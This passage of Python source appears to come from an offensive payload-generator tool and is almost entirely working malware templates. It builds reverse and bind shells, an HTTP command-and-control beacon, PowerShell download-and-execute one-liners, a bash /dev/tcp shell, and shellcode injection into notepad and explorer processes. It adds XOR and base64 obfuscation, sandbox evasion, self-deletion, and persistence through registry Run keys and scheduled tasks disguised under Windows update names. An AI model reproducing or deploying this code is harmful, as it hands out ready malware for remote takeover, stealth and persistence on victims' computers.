                    f"    try: s.connect(('{host}', {port})); break\n"
                    f"    except: time.sleep(5)\n"
                    f"while True:\n"
                    f"    try:\n"
                    f"        d = _x(s.recv(4096), {key}).decode().strip()\n"
                    f"        if not d: break\n"
                    f"        if d == 'exit': break\n"
                    f"        res = subprocess.getoutput(d)\n"
                    f"        s.send(_x((res + '\\n').encode(), {key}))\n"
                    f"    except: break\n"
                )
            else:
                logic = base64.b64decode(
                    "cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKd2hp"
                    "bGUgVHJ1ZToKICAgIHRyeToKICAgICAgICBzLmNvbm5lY3QoKCd7fScse30pKQogICAgICAg"
                    "IGJyZWFrCiAgICBleGNlcHQ6CiAgICAgICAgdGltZS5zbGVlcCg1KQpvcy5kdXAyKHMuZmls"
                    "ZW5vKCksMCkKb3MuZHVwMihzLmZpbGVubygpLDEpCm9zLmR1cDIocy5maWxlbm8oKSwyKQpz"
                    "dWJwcm9jZXNzLmNhbGwoWycvYmluL3NoJywnLWknXSkK"
                ).decode().format(host, port)
        elif ptype == "bind_shell":
            logic = (
                f"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                f"s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
                f"s.bind(('0.0.0.0', {port}))\n"
                f"s.listen(1)\n"
                f"conn, addr = s.accept()\n"
                f"os.dup2(conn.fileno(), 0)\n"
                f"os.dup2(conn.fileno(), 1)\n"
                f"os.dup2(conn.fileno(), 2)\n"
                f"subprocess.call(['/bin/sh', '-i'])\n"
            )
        elif ptype == "http_beacon":
            logic = (
                f"import urllib.request, json\n"
                f"while True:\n"
                f"    try:\n"
                f"        r = urllib.request.urlopen('http://{host}:{port}/tasks')\n"
                f"        tasks = json.loads(r.read())\n"
                f"        for t in tasks:\n"
                f"            out = subprocess.getoutput(t['cmd'])\n"
                f"            req = urllib.request.Request(\n"
                f"                'http://{host}:{port}/results',\n"
                f"                data=json.dumps({{'id': t['id'], 'output': out}}).encode()\n"
                f"            )\n"
                f"            urllib.request.urlopen(req)\n"
                f"    except: pass\n"
                f"    time.sleep(random.randint(5, 15))\n"
            )
        elif ptype == "shellcode_drop":
            sc_hex = adv.get("shellcode") or "90" * 64
            # Clean hex string
            sc_hex = "".join(c for c in sc_hex if c in string.hexdigits)
            sc_bytes = ", ".join([f"0x{sc_hex[i:i+2]}" for i in range(0, len(sc_hex), 2)])
            
            logic = (
                f"import ctypes\n"
                f"sc = bytearray([{sc_bytes}])\n"
                f"ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)\n"
                f"ctypes.windll.kernel32.RtlMoveMemory(ptr, (ctypes.c_char * len(sc)).from_buffer(sc), len(sc))\n"
                f"ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)\n"
                f"ctypes.windll.kernel32.WaitForSingleObject(-1, -1)\n"
            )
        elif ptype == "cmd_one_liner":
            ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('http://{host}:{port}/s')"
            b64_ps = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
            logic = f"os.system('powershell -e {b64_ps}')"
        elif ptype == "ps_dl_exec":
            logic = f"subprocess.Popen(['powershell', '-Command', \"IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/p')\"], shell=True)"
        elif ptype == "download_exec":
            logic = (
                f"import urllib.request, tempfile\n"
                f"url = 'http://{host}:{port}/payload.exe'\n"
                f"tmp = tempfile.NamedTemporaryFile(suffix='.exe', delete=False)\n"
                f"tmp.write(urllib.request.urlopen(url).read())\n"
                f"tmp.close()\n"
                f"subprocess.Popen(tmp.name, shell=True)\n"
            )
        else:
            logic = f"# Unknown payload type: {ptype}\npass\n"

        # ── Polymorphic XOR ──
        if poly:
            key = "".join(random.choices(string.ascii_letters, k=16))
            xhex = "".join(
                ["{:02x}".format(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(logic)]
            )
            code += f'_k="{key}"\n'
            code += f'_d="{xhex}"\n'
            code += 'exec("".join([chr(int(_d[i:i+2],16)^ord(_k[(i//2)%len(_k)])) for i in range(0,len(_d),2)]))\n'
        elif xor:
            key = random.randint(1, 255)
            xd = [ord(c) ^ key for c in logic]
            code += f"_x={xd}\n_k={key}\nexec(''.join([chr(c^_k) for c in _x]))\n"
        else:
            code += logic

        if melt:
            code += "\ntry: os.remove(sys.executable if getattr(sys, 'frozen', False) else __file__)\nexcept: pass\n"

        return code

    def _py_injection_stub(self, host, port):
        """APC process injection stub using ctypes (Pure Python, no deps)."""
        return f"""import ctypes
import ctypes.wintypes
import struct
import subprocess

# ── [STARK] APC Process Injection ──
# Injects into a spawned suspended process using QueueUserAPC

def _find_target():
    \\\"\\\"\\\"Spawn a suspended notepad.exe as injection target.\\\"\\\"\\\"
    k32 = ctypes.windll.kernel32
    SUSPENDED = 0x00000004
    si = subprocess.STARTUPINFO()
    si.dwFlags = 0x01
    si.wShowWindow = 0  # Hidden window
    pi = ctypes.c_void_p()

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", ctypes.c_void_p),
            ("hThread", ctypes.c_void_p),
            ("dwProcessId", ctypes.wintypes.DWORD),
            ("dwThreadId", ctypes.wintypes.DWORD),
        ]
    
    class STARTUPINFOW(ctypes.Structure):
        _fields_ = [
            ("cb", ctypes.wintypes.DWORD),
            ("lpReserved", ctypes.wintypes.LPWSTR),
            ("lpDesktop", ctypes.wintypes.LPWSTR),
            ("lpTitle", ctypes.wintypes.LPWSTR),
            ("dwX", ctypes.wintypes.DWORD),
            ("dwY", ctypes.wintypes.DWORD),
            ("dwXSize", ctypes.wintypes.DWORD),
            ("dwYSize", ctypes.wintypes.DWORD),
            ("dwXCountChars", ctypes.wintypes.DWORD),
            ("dwYCountChars", ctypes.wintypes.DWORD),
            ("dwFillAttribute", ctypes.wintypes.DWORD),
            ("dwFlags", ctypes.wintypes.DWORD),
            ("wShowWindow", ctypes.wintypes.WORD),
            ("cbReserved2", ctypes.wintypes.WORD),
            ("lpReserved2", ctypes.c_void_p),
            ("hStdInput", ctypes.c_void_p),
            ("hStdOutput", ctypes.c_void_p),
            ("hStdError", ctypes.c_void_p),
        ]
    
    si_w = STARTUPINFOW()
    si_w.cb = ctypes.sizeof(STARTUPINFOW)
    si_w.dwFlags = 0x01
    si_w.wShowWindow = 0
    pi_w = PROCESS_INFORMATION()
    
    k32.CreateProcessW(
        "C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe",
        None, None, None, False,
        SUSPENDED, None, None,
        ctypes.byref(si_w), ctypes.byref(pi_w)
    )
    return pi_w

def inject():
    k32 = ctypes.windll.kernel32
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40
    
    # Shellcode placeholder — replace with msfvenom output
    # msfvenom -p windows/x64/shell_reverse_tcp LHOST={host} LPORT={port} -f python
    sc = b"\\\\x90" * 64  # NOP sled placeholder
    
    pi = _find_target()
    
    # Allocate memory in target process
    addr = k32.VirtualAllocEx(
        pi.hProcess, None, len(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE
    )
    
    # Write shellcode
    written = ctypes.c_size_t(0)
    k32.WriteProcessMemory(
        pi.hProcess, addr, sc, len(sc), ctypes.byref(written)
    )
    
    # Queue APC to main thread
    k32.QueueUserAPC(addr, pi.hThread, None)
    
    # Resume thread to trigger APC
    k32.ResumeThread(pi.hThread)

if __name__ == "__main__":
    inject()
"""

    # ══════════════════════════════════════════════════════════════════
    #  GOLANG GENERATOR
    # ══════════════════════════════════════════════════════════════════
    def _gen_golang(self, host, port, xor, junk, sandbox, ptype, tpl, adv=None):
        adv = adv or {}
        code = tpl.get("prefix_go", "")
        code += 'package main\nimport ("net"; "os/exec"; "time")\n\n'
        if sandbox:
            code += "func checkVM() { time.Sleep(2 * time.Second) }\n"
        code += "func main() {\n"
        if sandbox:
            code += "    checkVM()\n"
        if junk:
            code += f"    // {self._rstr(40)}\n"

        if ptype == "reverse_tcp":
            logic = base64.b64decode(
                "YywgXyA6PSBuZXQuRGlhbCgidGNwIiwgInswfTpwMX0iKQpjbWQgOj0gZXhlYy5Db21tYW5k"
                "KCIvYmluL3NoIikKY21kLlN0ZGluID0gYwpjbWQuU3Rkb3V0ID0gYwpjbWQuU3RkZXJyID0g"
                "YwpjbWQuUnVuKCkK"
            ).decode().replace("{0}", host).replace("p1", port)
        elif ptype == "bind_shell":
            logic = (
                f'    ln, _ := net.Listen("tcp", "0.0.0.0:{port}")\n'
                f'    conn, _ := ln.Accept()\n'
                f'    cmd := exec.Command("/bin/sh")\n'
                f'    cmd.Stdin = conn\n    cmd.Stdout = conn\n    cmd.Stderr = conn\n'
                f'    cmd.Run()\n'
            )
        else:
            logic = base64.b64decode(
                "YywgXyA6PSBuZXQuRGlhbCgidGNwIiwgInswfTpwMX0iKQpjbWQgOj0gZXhlYy5Db21tYW5k"
                "KCIvYmluL3NoIikKY21kLlN0ZGluID0gYwpjbWQuU3Rkb3V0ID0gYwpjbWQuU3RkZXJyID0g"
                "YwpjbWQuUnVuKCkK"
            ).decode().replace("{0}", host).replace("p1", port)

        code += logic + "}\n"
        return code

    # ══════════════════════════════════════════════════════════════════
    #  C# GENERATOR (with optional injection)
    # ══════════════════════════════════════════════════════════════════
    def _gen_csharp(self, host, port, xor, junk, sandbox, inject=False, ptype="reverse_tcp", tpl=None, adv=None):
        adv = adv or {}
        tpl = tpl or PAYLOAD_TEMPLATES["none"]
        melt = adv.get("melt", False)
        persist = adv.get("persist", "none")
        
        code = tpl.get("prefix_cs", "")
        code += "using System;\nusing System.Net.Sockets;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Runtime.InteropServices;\nusing System.Threading;\nusing System.Text;\n\n"
        code += "namespace C2 {\n    class Program {\n"

        if sandbox:
            code += base64.b64decode(
                "W0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wg"
                "SXNEZWJ1Z2dlclByZXNlbnQoKTsgc3RhdGljIHZvaWQgQ2hlY2tFbnYoKSB7IGlmKElzRGVi"
                "dWdnZXJQcmVzZW50KCkpIEVudmlyb25tZW50LkV4aXQoMSk7IGlmKEVudmlyb25tZW50LlBy"
                "b2Nlc3NvckNvdW50IDwgMikgRW52aXJvbm1lbnQuRXhpdCgxKTsgfQ=="
            ).decode() + "\n"

        if inject:
            code += self._csharp_injection_stub(host, port, melt)
        else:
            if persist != "none":
                code += self._csharp_persist_stub(persist) + "\n"

            code += "        static void Main() {\n"
            if sandbox:
                code += "            CheckEnv();\n"
            if junk:
                code += f'            string _v = "{self._rstr(8)}";\n'

            logic = base64.b64decode(
                "dHJ5IHsgdXNpbmcoVGNwQ2xpZW50IGMgPSBuZXcgVGNwQ2xpZW50KCJ7MH0iLCB7MX0pKSB7"
                "IHVzaW5nKFN0cmVhbSBzID0gYy5HZXRTdHJlYW0oKSkgeyBTdHJlYW1SZWFkZXIgcmRyID0g"
                "bmV3IFN0cmVhbVJlYWRlcihzKTsgU3RyZWFtV3JpdGVyIHd0ciA9IG5ldyBTdHJlYW1Xcml0"
                "ZXIocyk7IFByb2Nlc3MgcCA9IG5ldyBQcm9jZXNzKCk7IHAuU3RhcnRJbmZvLkZpbGVOYW1l"
                "ID0gImNtZC5leGUiOyBwLlN0YXJ0SW5mby5DcmVhdGVOb1dpbmRvdyA9IHRydWU7IHAuU3Rh"
                "cnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlOyBwLlN0YXJ0SW5mby5SZWRpcmVjdFN0"
                "YW5kYXJkT3V0cHV0ID0gdHJ1ZTsgcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZElucHV0"
                "ID0gdHJ1ZTsgcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZEVycm9yID0gdHJ1ZTsgcC5P"
                "dXRwdXREYXRhUmVjZWl2ZWQgKz0gKHMxLCBlMSkgPT4geyBpZihlMS5EYXRhICE9IG51bGwp"
                "IHsgd3RyLldyaXRlTGluZShlMS5EYXRhKTsgd3RyLkZsdXNoKCk7IH0gfTsgcC5TdGFydCgp"
                "OyBwLkJlZ2luT3V0cHV0UmVhZExpbmUoKTsgd2hpbGUoIXAuSGFzRXhpdGVkKSB7IHN0cmlu"
                "ZyBjMSA9IHJkci5SZWFkTGluZSgpOyBpZihjMSA9PSBudWxsKSBicmVhazsgcC5TdGFyZGFy"
                "ZElucHV0LldyaXRlTGluZShjMSk7IH0gfSB9IH0gY2F0Y2ggeyB9"
            ).decode().format(host, port)
            code += "            " + logic + "\n"
            
            if melt:
                code += "            try { Process.Start(new ProcessStartInfo { FileName = \"cmd.exe\", Arguments = \"/c choice /t 1 /d y /n & del \\\"\" + Process.GetCurrentProcess().MainModule.FileName + \"\\\"\", CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden }); } catch {} \n"

            code += "        }\n"

        code += "    }\n}\n"
        return code

    def _csharp_injection_stub(self, host, port, melt=False):
        return f"""
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(int a, bool b, int c);
        
        delegate IntPtr VAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
        delegate bool WProcMem(IntPtr h, IntPtr b, byte[] buf, int s, out IntPtr w);
        delegate IntPtr CRemThread(IntPtr h, IntPtr a, uint s, IntPtr addr, IntPtr p, uint f, IntPtr t);

        static void Main() {{
            var procs = Process.GetProcessesByName("explorer");
            if (procs.Length == 0) return;
            int pid = procs[0].Id;

            byte[] sc = new byte[] {{ 0x90, 0x90, 0x90 }}; 

            IntPtr hK32 = GetModuleHandle("kernel32.dll");
            VAllocEx vAlloc = (VAllocEx)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hK32, "VirtualAllocEx"), typeof(VAllocEx));
            WProcMem wMem = (WProcMem)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hK32, "WriteProcessMemory"), typeof(WProcMem));
            CRemThread cThread = (CRemThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hK32, "CreateRemoteThread"), typeof(CRemThread));

            IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = vAlloc(hProc, IntPtr.Zero, (uint)sc.Length, 0x1000, 0x40);
            IntPtr written;
            wMem(hProc, addr, sc, sc.Length, out written);
            cThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            
            if ({str(melt).lower()}) {{
                 try {{ Process.Start(new ProcessStartInfo {{ FileName = "cmd.exe", Arguments = "/c choice /t 1 /d y /n & del \\\"" + Process.GetCurrentProcess().MainModule.FileName + "\\\"", CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden }}); }} catch {{}}
            }}
        }}
"""

    # ══════════════════════════════════════════════════════════════════
    #  NIM GENERATOR
    # ══════════════════════════════════════════════════════════════════
    def _gen_nim(self, host, port, xor, junk, sandbox, ptype="reverse_tcp", tpl=None, adv=None):
        adv = adv or {}
        code = "import net, osproc, os, strutils\n\n"
        if sandbox:
            code += "if getTotalMem() < 2000000000: quit()\n"
        if junk:
            code += f"# {self._rstr(40)}\n"

        code += base64.b64decode(
            "bGV0IHMgPSBuZXdTb2NrZXQoKQp0cnk6CiAgcy5jb25uZWN0KCJ7MH0iLCBQb3J0KHsxfSkp"
            "CiAgbGV0IHAgPSBzdGFydFByb2Nlc3MoImNtZC5leGUiLCBvcHRpb25zPXtwb1BhcmVudFN0"
            "cmVhbXMsIHBvVXNlUGF0aCwgcG9EYWVtb259KQpleGNlcHQ6CiAgZGlzY2FyZAo="
        ).decode().format(host, port)
        return code

    # ══════════════════════════════════════════════════════════════════
    #  RUST GENERATOR
    # ══════════════════════════════════════════════════════════════════
    def _gen_rust(self, host, port, xor, junk, sandbox, ptype="reverse_tcp", tpl=None, adv=None):
        adv = adv or {}
        code = "use std::net::TcpStream;\nuse std::process::{Command, Stdio};\nuse std::io::{Read, Write};\n\n"
        code += "fn main() {\n"
        if sandbox:
            code += '    if std::env::var("USERNAME").unwrap_or_default() == "sandbox" { return; }\n'
        if junk:
            code += f"    // {self._rstr(30)}\n"

        code += base64.b64decode(
            "aWYgbGV0IE9rKG11dCBzdHJlYW0pID0gVGNwU3RyZWFtOjpjb25uZWN0KCJ7MH06ezF9Iikg"
            "ewogICAgICAgIGxldCBtdXQgY2hpbGQgPSBDb21tYW5kOjpuZXcoImNtZC5leGUiKQogICAg"
            "ICAgICAgICAuc3RkaW4oU3RkaW86OnBpcGVkKCkpCiAgICAgICAgICAgIC5zdGRvdXQoU3Rk"
            "aW86OnBpcGVkKCkpCiAgICAgICAgICAgIC5zdGRlcnIoU3RkaW86OnBpcGVkKCkpCiAgICAg"
            "ICAgICAgIC5zcGF3bigpCiAgICAgICAgICAgIC5leHBlY3QoImZhaWxlZCIpOwogICAgICAg"
            "IGNoaWxkLndhaXQoKS51bndyYXAoKTsKICAgIH0K"
        ).decode().format(host, port)
        code += "}\n"
        return code

    # ══════════════════════════════════════════════════════════════════
    #  POWERSHELL GENERATOR
    # ══════════════════════════════════════════════════════════════════
    def _gen_ps1(self, host, port, xor, junk, sandbox, ptype, tpl, adv=None):
        adv = adv or {}
        code = ""
        melt = adv.get("melt", False)
        persist = adv.get("persist", "none")
        encrypt = adv.get("encrypt", False)

        if adv.get("sleep"):
            code += f"Start-Sleep -Seconds {adv['sleep']}\n"
        
        if adv.get("env_key"):
            code += f"if ($env:COMPUTERNAME -ne '{adv['env_key']}' -and $env:USERNAME -ne '{adv['env_key']}') {{ exit }}\n"
            
        if persist != "none":
             code += self._ps1_persist_stub(persist) + "\n"

        if ptype == "reverse_tcp":
            if encrypt:
                key = random.randint(1, 255)
                code += (
                    f"$c = New-Object System.Net.Sockets.TCPClient('{host}',{port});$s = $c.GetStream();"
                    f"function _x($d, $k) {{ $o = New-Object byte[] $d.Length; for($i=0; $i -lt $d.Length; $i++) {{ $o[$i] = $d[$i] -bxor $k }}; return $o }};"
                    f"while(($i = $s.Read(($b = New-Object byte[] 4096), 0, 4096)) -ne 0) {{ "
                    f"$d = [System.Text.Encoding]::ASCII.GetString(_x($b[0..($i-1)], {key})).Trim(); "
                    f"if($d -eq 'exit') {{ break }}; $o = (iex $d 2>&1 | Out-String); "
                    f"$x = _x([System.Text.Encoding]::ASCII.GetBytes($o + \"`nPS \"), {key}); $s.Write($x, 0, $x.Length) }}; $c.Close()"
                )
            else:
                code += f"$c = New-Object System.Net.Sockets.TCPClient('{host}',{port});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$o = (iex $d 2>&1 | Out-String );$t  = $o + 'PS ' + (pwd).Path + '> ';$x = ([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()}};$c.Close()"
        elif ptype == "ps_dl_exec" or ptype == "cmd_one_liner":
            code += f"IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/p')"
        else:
            code += "# No PS1 implementation for this type yet"
        
        if melt:
            code += "\nRemove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue\n"
        return code

    # ══════════════════════════════════════════════════════════════════
    #  DUCKYSCRIPT GENERATOR
    # ══════════════════════════════════════════════════════════════════
    def _gen_ducky(self, host, port, ptype, adv=None):
        adv = adv or {}
        code = "REM Generated by Nextral Venomous\nDELAY 1000\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 500\n"
        if ptype == "reverse_tcp":
            ps_code = f"$c = New-Object System.Net.Sockets.TCPClient('{host}',{port});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);iex $d}}"
            code += f"STRING {ps_code}\nENTER\n"
        else:
            code += "STRING echo 'Payload ready.'\nENTER\n"
        return code

    # ══════════════════════════════════════════════════════════════════
    #  ONE-LINER GENERATOR
    # ══════════════════════════════════════════════════════════════════
    def _gen_line(self, host, port, ptype, adv=None):
        adv = adv or {}
        if ptype == "ps_dl_exec" or ptype == "cmd_one_liner":
            return f"powershell -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/p')\""
        elif ptype == "reverse_tcp":
            return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        return "# No one-liner available"

    # ══════════════════════════════════════════════════════════════════
    #  HELPERS
    # ══════════════════════════════════════════════════════════════════
    def _rstr(self, n: int) -> str:
        return "".join(random.choices(string.ascii_letters + string.digits, k=n))

    def _py_junk(self) -> str:
        v1, v2 = self._rstr(8), self._rstr(8)
        n = random.randint(10, 50)
        return f"def _{v1}():\n    {v2} = [x**2 for x in range({n})]\n    return sum({v2})\n_{v1}()\n"

    # ══════════════════════════════════════════════════════════════════
    #  PERSISTENCE HELPERS
    # ══════════════════════════════════════════════════════════════════
    def _py_persist_stub(self, mode: str) -> str:
        if mode == "registry":
            return (
                "import winreg, sys, os\n"
                "try:\n"
                "    k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n"
                "    winreg.SetValueEx(k, 'WindowsUpdateHost', 0, winreg.REG_SZ, sys.executable + ' ' + (os.path.realpath(__file__) if not getattr(sys, 'frozen', False) else sys.executable))\n"
                "    winreg.CloseKey(k)\n"
                "except: pass"
            )
        elif mode == "schtask":
            return "import os, sys; os.system('schtasks /create /tn \"SecurityHealthService\" /tr \"' + sys.executable + ' ' + (os.path.realpath(__file__) if not getattr(sys, 'frozen', False) else sys.executable) + '\" /sc daily /st 12:00 /f')"
        elif mode == "startup":
            return (
                "import os, shutil, sys\n"
                "try:\n"
                "    dst = os.path.join(os.environ['APPDATA'], r'Microsoft\\Windows\\Start Menu\\Programs\\Startup', 'svchost_task.py')\n"
                "    shutil.copy(os.path.realpath(__file__) if not getattr(sys, 'frozen', False) else sys.executable, dst)\n"
                "except: pass"
            )
        return ""

    def _csharp_persist_stub(self, mode: str) -> str:
        if mode == "registry":
            return (
                "        static void Install() {\n"
                "            try {\n"
                "                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", true);\n"
                "                key.SetValue(\"WinUpdateAgent\", Process.GetCurrentProcess().MainModule.FileName);\n"
                "            } catch {}\n"
                "        }\n"
            )
        elif mode == "schtask":
            return "        static void Install() { try { Process.Start(new ProcessStartInfo { FileName = \"schtasks\", Arguments = \"/create /tn \\\"SecurityHealthService\\\" /tr \\\"\" + Process.GetCurrentProcess().MainModule.FileName + \"\\\" /sc daily /st 12:00 /f\", CreateNoWindow = true }); } catch {} }\n"
        return ""

    def _ps1_persist_stub(self, mode: str) -> str:
        if mode == "registry":
            return "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value $MyInvocation.MyCommand.Path -PropertyType String -Force"
        elif mode == "schtask":
            return "Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument \"-WindowStyle Hidden -File $($MyInvocation.MyCommand.Path)\") -Trigger (New-ScheduledTaskTrigger -Daily -At 12pm) -TaskName 'SecurityUpdate' -Force"
        return ""

    def action_copy_payload(self) -> None:
        if self.selected_payload:
            try:
                pyperclip.copy(self.selected_payload)
                self.app.notify("Payload copied to clipboard!", severity="information")
            except Exception:
                self.app.notify("Failed to copy payload", severity="error")
        else:
            self.app.notify("No payload generated yet", severity="warning")
